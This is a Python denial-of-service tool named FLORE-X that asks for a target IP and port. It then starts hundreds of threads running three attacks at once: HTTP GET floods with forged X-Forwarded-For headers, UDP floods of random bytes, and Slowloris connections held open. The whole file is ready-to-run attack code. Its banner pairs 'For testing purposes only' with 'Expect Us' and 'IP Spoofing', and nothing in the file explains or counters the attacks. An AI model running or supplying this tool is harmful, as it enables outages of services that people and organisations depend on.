#!/usr/bin/python3
# -*- coding: utf-8 -*-
#  flore-x ddos
# S.P.S TEAM - @S_P_I_D_E_YYYY

import time, sys, socket, threading, random, os
from queue import Queue

# ============ User Agents ============
UAGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0 Safari/537.36"
]

# ============ Headers ============
HEADERS_DATA = """Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
"""

# ============ المتغيرات ============
sent = 0
failed = 0
lock = threading.Lock()
running = True

def http_worker(host, port):
    global sent, failed
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, port))
            
            ua = random.choice(UAGENTS)
            packet = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\n"
            packet += f"Host: {host}\r\n"
            packet += f"User-Agent: {ua}\r\n"
            packet += HEADERS_DATA
            packet += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
            packet += "\r\n"
            
            s.send(packet.encode())
            
            with lock:
                sent += 1
                if sent % 100 == 0:
                    print(f"\033[92m✅ {sent:,} packets sent\033[0m")
            
            s.close()
            time.sleep(0.01)
            
        except:
            with lock:
                failed += 1
            try:
                s.close()
            except:
                pass

def udp_worker(host, port):
    global sent, failed
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while running:
        try:
            data = os.urandom(random.randint(64, 1490))
            s.sendto(data, (host, port))
            with lock:
                sent += 1
            time.sleep(0.001)
        except:
            with lock:
                failed += 1

def slowloris_worker(host, port):
    global sent, failed
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            
            ua = random.choice(UAGENTS)
            s.send(f"GET /?{random.randint(1,999999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\n".encode())
            
            for _ in range(100):
                try:
                    s.send(f"X-keep: {random.randint(1,999999)}\r\n".encode())
                    time.sleep(random.uniform(0.1, 0.5))
                except:
                    break
            
            with lock:
                sent += 100
            
            s.close()
        except:
            with lock:
                failed += 1
            try:
                s.close()
            except:
                pass

def main():
    global running
    
    print("""\033[91m
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   \033[93m███████╗██╗      ██████╗ ██████╗ ███████╗     \033[96m██╗  ██╗\033[91m           ║
║   \033[93m██╔════╝██║     ██╔═══██╗██╔══██╗██╔════╝     \033[96m╚██╗██╔╝\033[91m           ║
║   \033[93m█████╗  ██║     ██║   ██║██████╔╝█████╗        \033[96m╚███╔╝\033[91m            ║
║   \033[93m██╔══╝  ██║     ██║   ██║██╔══██╗██╔══╝        \033[96m██╔██╗\033[91m            ║
║   \033[93m██║     ███████╗╚██████╔╝██║  ██║███████╗     \033[96m██╔╝ ██╗\033[91m           ║
║   \033[93m╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝     \033[96m╚═╝  ╚═╝\033[91m           ║
║                                                                      ║
║   \033[92m🔥 FLORE-X DDoS TOOL 🔥\033[91m                                        ║
║                                                                      ║
║   \033[95m❤️  SPIDEY X CHEAT\033[91m              \033[95m⚔️ For testing purposes only  ⚠️\033[91m            ║
║   \033[95m👤 @S_P_I_D_E_YYYY\033[91m              \033[95m💀 Expect Us\033[91m                   ║
║                                                                      ║
║   \033[93m⚡ HTTP Flood | UDP Flood | Slowloris | IP Spoofing ⚡\033[91m          ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝\033[0m

\033[92mFLORE-X DDoS Tool
    usage : python3 flore-x.py [-s] [-p] [-t]
    -h : help
    -s : server ip
    -p : port default 80
    -t : turbo default 500 \033[0m
""")
    
    host = input("\033[96m🎯 Target IP: \033[0m").strip()
    port = int(input("\033[96m🔌 Port [80]: \033[0m") or 80)
    threads = int(input("\033[96m🧵 Threads [500]: \033[0m") or 500)
    
    total = threads * 3
    print(f"\n\033[91m🔥 Attacking {host}:{port} | {total} threads\033[0m\n")
    
    for _ in range(threads):
        threading.Thread(target=http_worker, args=(host, port), daemon=True).start()
        threading.Thread(target=udp_worker, args=(host, port), daemon=True).start()
        threading.Thread(target=slowloris_worker, args=(host, port), daemon=True).start()
    
    start = time.time()
    try:
        while True:
            time.sleep(1)
            with lock:
                elapsed = time.time() - start
                print(f"\r\033[92m✅ {sent:,}\033[0m | \033[91m❌ {failed:,}\033[0m | \033[96m⚡ {sent/elapsed:.0f}/s\033[0m", end="")
    except KeyboardInterrupt:
        running = False
        elapsed = time.time() - start
        print(f"\n\n\033[91m⏹️ Stopped\033[0m | \033[92m✅ {sent:,}\033[0m | \033[91m❌ {failed:,}\033[0m | \033[96m⚡ {sent/elapsed:.0f}/s\033[0m")

if __name__ == "__main__":
    main()